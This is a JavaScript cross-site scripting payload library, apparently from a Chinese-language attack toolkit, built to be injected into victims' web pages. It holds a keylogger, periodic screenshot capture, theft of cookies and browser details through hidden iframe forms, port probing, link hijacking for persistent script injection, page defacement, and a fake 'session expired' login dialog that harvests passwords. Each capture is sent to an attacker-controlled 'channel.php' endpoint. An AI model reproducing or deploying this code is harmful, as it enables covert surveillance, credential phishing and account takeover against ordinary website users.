// !function() {
//   var baseUrl = '//localhost/well/js' || document.currentScript ? document.currentScript.src : (function() {
//     var js = document.scripts;
//     return js[js.length - 1].src;
//   })();
  
//  // var baseUrl = baseUrl.substring(0, baseUrl.lastIndexOf('/'));
//   //baseUrl = baseUrl  
// }();

// document.body.appendChild(document.createElement('script')).src='http://localhost/well/0.js';

var xss = {

    name: '__xss$cebb7610aedb55ea8459747d12d1134a.js',

    getUrlParam: function (p) {
        var vars = location.search.substring(1).split("&");
        for (var i=0; i < vars.length; i++) {
            var pair = vars[i].split("=");
            if(pair[0] == p){return pair[1];}
        }
    },

    loadStyle: function (url, bom) {
        var e = document.createElement('link');
        e.type = 'text/css';
        e.rel = 'stylesheet';
        e.href = url;
        (bom || window).document.getElementsByTagName('head')[0].appendChild(e);
    },

    loadStyleString: function (style, bom) {
        var e = document.createElement('style');
        e.type = 'text/css';
        try{
            e.appendChild(document.createTextNode(style));
        }catch(e) {
            e.styleSheet.cssText = style;
        }
        (bom || window).document.getElementsByTagName('head')[0].appendChild(e);
    },

    /*
         在当前页面 针对同域链接实施浏览器劫持
         当打开的链接和当前页面是同域时
         将指定的js注入新打开的页面 持久化控制
         如果是不同域的代码会因浏览器安全策略报错
    */
    hookLinks: function (url){
    // 从url中提取域名结果形如 http://www.xxx.com/
        function getUrl(url){
            var url = url.match(/((https?:\/\/.+?)\/|(https?:\/\/.+))/i)[0];
            return (url[url.length -1] !== '/') ? url + '/' : url;
        }
        for (var i = 0; i < document.links.length; i++){
            // 如果链接和当前页面同域 劫持之
            if(getUrl(url) === getUrl(document.links[i].href)){
                document.links[i].onclick = function (event) {
                    var win = window.open(event.currentTarget.href);
                    setTimeout(function(){loadScript(url, win)}, 5000);
                    return false;
                };
            }
        }
    },

    /* 利用函数注释生成原样字符串
    */
    rawString: function(func) {
        func += '';
        return func.substring(func.indexOf("/*") + 2, func.lastIndexOf("*/"));
    },

    // 移除节点
    removeNode: function (node) { 
        node.parentNode.removeChild(node);
    },

    createElements: function (str, element, attribute, parentNode){
        var e = document.createElement(element || 'div'),
            parentNode = parentNode || document.body;

        if(typeof str === 'function') {
            str += '';
            str = str.substring(str.indexOf("/*") + 2, str.lastIndexOf("*/"));
        }
        if((typeof attribute === "object") && (attribute.constructor === Object)){
            for(var i in attribute){
                e.setAttribute(i, attribute[i]);
            }
        }
        e.innerHTML = str;
        parentNode.appendChild(e);
        return e;
    },

    hackpage: function(t) {
        xss.loadStyleString(xss.rawString(function(){
            /*
        .logoHacked-text {
            position: fixed;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            color: #00FF00;
            z-index: 1000000000000;
            background-color: black;
        }

        .center-in-page {
            position: absolute;
            top: 50%;
            left: 50%;
            -webkit-transform: translate(-50%, -50%);
            -moz-transform: translate(-50%, -50%);
            -ms-transform: translate(-50%, -50%);
            -o-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
        }
            */
        }));

        document.body.innerText = '';
        var div = document.body.appendChild(document.createElement('div'));
        div.className = 'logoHacked-text';
        div.style.fontSize = '20px';//isMobile ? "40px" : "70px";
        //div.innerText = t || 'I am K';
        var img = div.appendChild(new Image);
        img.src = 'http://localhost/well/img/hackpage.jpeg';
        img.className = 'center-in-page';
    },

    screenshot: function (repeat) {
        function _screenshot() {
            require(['html2canvas'], function(html2canvas) {
              $j(function() {
                html2canvas(document.body).then(function(canvas) {
                    var canvasData = canvas.toDataURL();
                    xss.net.upload(canvasData, 'screenshot');
                });
              });
            });
        }

        _screenshot();

        if (repeat !== undefined) {
            setInterval(_screenshot, repeat);
        }
    },

    keylogger: function () {
        var timeStart = new Date,
            log = '';
        $j(document).keydown(function (e) {
            var key = e.keyCode || e.which || e.charCode,
                keyMap = {
                    13: 'enter', 32: 'space', 46: 'delete', 8: 'backSpace',
                    9: 'tab', 27: 'esc', 37: 'left', 38: 'up', 
                    39: 'right', 40: 'down',
                    33: 'pageUp', 34: 'pageDown', 35: 'end', 36: 'home',
                    16: 'shift', 17: 'ctrl', 18: 'alt', 20: 'capsLock',
                    186: ';', 187: '=', 188: ',', 189: '-', 190: '.', 191: '/', 192: '`',
                    219: '[', 220: '\\', 221: ']'
                };
            var k = keyMap[key] !== undefined ? '[' + keyMap[key] + ']' : String.fromCharCode(key);
            if ([186, 187, 188, 189, 190, 191, 192, 219, 220, 221].indexOf(key) >= 0) {
                k = k.slice(1, -1);
            }
            log += k;
        });
        //xss.net.upload({start: new Date, end: new Date, log: 'wef'}, 'keylogger')
        $j(window).on('beforeunload', function (e) {
            xss.net.upload({start: timeStart, end: new Date, log: log}, 'keylogger');
        });
    }
};


xss.net = {
    csPost: function (url, data) {
        var d=document,f=d.body.appendChild(d.createElement('iframe')),c=f.contentDocument;
        f.style.display = 'none';
        c.write('<form method="POST" action="http://'+url+'"><input name="d"></form>');
        c.forms[0].d.value=typeof data=='string'?data:JSON.stringify(data);
        c.forms[0].submit();
        setTimeout(function(){d.body.removeChild(f)},100);
    },

    postData: function (url, type, payload) {
        var d=document,n=navigator;
        xss.net.csPost(url, {
            type: type || 'default',
            url: d.URL,
            referrer: d.referrer,
            userAgent: n.userAgent,
            platform: n.platform,
            title: d.title,
            language: n.language,
            screen: screen.width+'x'+screen.height,
            cookie: d.cookie,
            payload: payload,
        });
    },

    upload: function (data, type) {
        xss.net.postData(xss.channel, type, data);
    },

    // 探测主机端口 不太稳定 有的端口打开了也探测不到 有的可以
    ping: function (ip, port, callback) {
        var img = document.createElement('img');

        img.onload = img.onerror = function () {
            if(!img) return;
            img = null;
            callback(true);
        };

        img.src = 'http://' + ip + ':' + port;
        setTimeout(function() {
            if(!img) return;
            img = null;
            callback(false);
        }, 1000);
    },

    // 创建隐藏表单发起post、get请求
    // 例 sendForm('http://127.0.0.1/log?', {username: 2, password: 24});
    sendForm: function (url, inputs, method) {
        var e = null,
            form = document.createElement('form');

        method = method || 'post';
        form.method = method;
        form.action = url;
        document.body.appendChild(form);

        for (var i in inputs) {
            e = document.createElement('input');
            e.type = 'text';
            e.name = i;
            e.value = inputs[i];
            e.style.display = 'none';
            form.appendChild(e);
        }
        form.submit();
    },
}

xss.cookie = {
    get: function (key) {
        var a, r = new RegExp("(^| )" + key + "=([^;]*)(;|$j)");
        if (a = document.cookie.match(r)) {
            return unescape(a[2]);
        }
    },

    del: function (key) {
        document.cookie = key + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;";
    },

    set: function (key, value, t) {
        var d = new Date(),
            exp = arguments.length == 3 ? t : 9999 * 24 * 60 * 60 * 1000;
        d.setTime(d.getTime() + exp);
        document.cookie = key + "=" + value + ";expires=" + d.toGMTString();
    }
}


// 当前脚本完整url路径
xss.currentScript = (function() {
    for (var j = document.scripts, i = j.length - 1; i >= 0; i--) {
        var r = j[i].src;
        if ((r.lastIndexOf(xss.name) >= 0) && (r.lastIndexOf(xss.name) + xss.name.length) == r.length) {
            return r;
        }
    }
})();

// 通信模块地址
xss.channel = xss.currentScript.replace('s/' + xss.name, '') + 'channel.php';


window.onerror = function (msg, url, line, col, error) {
    //console.log('[LINE:' + line + '] [ERROR:' + msg + ']' + 'url:'+url + '|error:'+error+'|col:'+col);
    //return true;
};

xss.fishing = function () {
    // 创建伪造的模态框 诱使用户输入账户密码 点登陆后 推送账户密码至接收模块
    if(!document.getElementsByClassName("fishing-dialog-overlay")[0]){
        xss.createElements(function(){
        /*
        <style>
        .fishing-dialog-overlay {
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            height: 9999999999px;
            z-index: 2147483646;
            background-color: black;
            opacity: 0.7;
            visibility: hidden;
        }
        .fishing-dialog-box{
            visibility: hidden;
            position: fixed;
            left: 50%;
            top: 39%;
            transform: translate(-50%,-50%);

            width: 270px;
            height: 204px;
            border: 1px solid rgb(204, 208, 212);
            margin: 20px 0px 0px;
            padding: 26px 24px 46px;
            background-color: #ffffff;
            z-index: 2147483647;
            border-radius: 6px;
        }

        .fishing-input {
            width: 270px;
            height: 40px;
            background: rgb(251, 251, 251) none repeat scroll 0% 0% / auto padding-box border-box;
            border: 1px solid rgb(126, 137, 147);
            border-radius: 4px;
            font: 24px / 32px -apple-system, system-ui, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
            padding: 3px 5px;
            margin: 0px 6px 16px 0px;
            outline: rgb(50, 55, 60) none 0px;
        }

.fishing-input:focus {
    border-color: #337cb5;
    border-width: 2px;
}

.fishing-button {
    border: 1px solid rgb(0, 124, 186);
    width: 58px;
    height: 40px;
    font: 14px / 38px -apple-system, system-ui, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    background: rgb(0, 124, 186) none repeat scroll 0% 0% / auto padding-box border-box;
    color: rgb(255, 255, 255);
    border-radius: 3px;
    outline: rgb(255, 255, 255) none 0px;
    cursor: pointer;
    margin: 0px 0px 4px;
    padding: 0px 14px;
    float: right;
}

.fishing-button:hover {
    background: #2e719d;
}

.fishing-button:active {
    background: #286697;
}

.fishing-label {
    font: 14px / 21px -apple-system, system-ui, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
    color: rgb(68, 68, 68);
    margin: 0px 0px 3px;
    padding: 0px;
    border: 0px none rgb(68, 68, 68);
    cursor: pointer;
    height: 21px;
    display: inline-block;
}

.fishing-check {
    border: 1px solid rgb(126, 137, 147);
    width: 25px;
    height: 25px;
    display : inline-block;
}

.fishing-div {
    width: 270px;
    height: 80px;
    margin: -4px 4px 0px 0px;
    cursor: pointer;
}
        </style>


        <div class="fishing-dialog-overlay"></div>

<form name="auth-dialog-form" class="fishing-dialog-box">
    <div class="fishing-div">
    <label class="fishing-label">用户名或电子邮件地址</label>
    <input type="text" name="username" class="fishing-input">
    </div>

    <div class="fishing-div">
    <label class="fishing-label">密码</label>
    <input type="password" name="password" class="fishing-input">
    </div>
    
    <label class="fishing-label" style="color:red;margin-top:8px;">您的会话已过期请登录后再试</label>
    <input type="submit" value="登录" class="fishing-button">
</form>
        */
        });
    }

    document.forms["auth-dialog-form"].onsubmit = function (event){
        var username = this.username.value,
            password = this.password.value;

        if (username == '' || password == '') {return false;}
        xss.net.upload({username: username, password: password}, 'fishing');
        document.getElementsByClassName("fishing-dialog-overlay")[0].style.visibility = "hidden";
        document.getElementsByClassName("fishing-dialog-box")[0].style.visibility = "hidden";
        //种下cookie 避免每次都弹出对话框 如果cookie已存在，就不再弹出对话框
        xss.cookie.set('fishing', '1');
        return false;
    };
    // 显示伪造的登陆框
    if (true) { // xss.cookie.get('fishing') !== '1'
        document.getElementsByClassName("fishing-dialog-overlay")[0].style.visibility = "visible";
        document.getElementsByClassName("fishing-dialog-box")[0].style.visibility = "visible";
    }
}
